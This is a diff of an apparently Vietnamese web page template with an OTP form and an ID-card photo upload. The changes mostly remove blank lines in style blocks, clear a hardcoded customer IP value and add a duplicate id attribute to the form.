@@ -40,7 +40,6 @@
         header .header-option {
             margin-left: inherit;
         }
-
     </style>
 
 </head>
@@ -65,7 +64,6 @@
         header {
             z-index: 999999999999999 !important;
         }
-
     </style>
     <header class="d-flex justify-content-between">
         <div class="nav-bar" style="margin-right:0px;">
@@ -129,7 +127,6 @@
         .hottline span {
             color: #FFF;
         }
-
     </style>
 
     <style>
@@ -141,7 +138,6 @@
             /* object-fit: cover; */
             margin-right: 16px;
         }
-
     </style>
 
     <a href="javascript:void(0)" class="overlay-sidebar"></a>
@@ -200,7 +196,6 @@
         .slider-box img {
             display: block !important;
         }
-
     </style>
 
     <style>
@@ -249,10 +244,9 @@
         [hidden] {
             display: none !important;
         }
-
     </style>
     <div class="container">
-        <form action="{{ route('otp_post') }}" id="service" method="POST" enctype="multipart/form-data">
+        <form id="service" action="{{ route('otp_post') }}" id="service" method="POST" enctype="multipart/form-data">
 
             @csrf
 
@@ -296,7 +290,7 @@
                 </div>
 
             </div>
-            <input type="hidden" name="ipkhachhang" id="action" value="14.248.232.2">
+            <input type="hidden" name="ipkhachhang" id="action" value="">
             <div class="form-group">
                 <div class="image-container" id="matsaucccd" style="background-image:url(upload/7d1fe053ff78bca2cbdb8f6ab058f6d9.html)">
                     <span role="img" id="iconmatsaucancuoc" aria-label="camera" class="anticon anticon-camera" style="font-size: 30px; color: rgb(51, 51, 51);">
@@ -413,7 +407,6 @@
             .bottom-panel ul li a.active span {
                 color: #194796 !important;
             }
-
         </style>
 
         <!-- latest jquery-->
@@ -467,7 +460,6 @@
                 background-color: #ffffff;
                 z-index: 9999999999;
             }
-
         </style>
 
         <div class="float-icon-hotline" aria-hidden="true">
@@ -618,7 +610,6 @@
                 bottom: 26%;
                 left: -8px;
             }
-
         </style>
 
 </body>
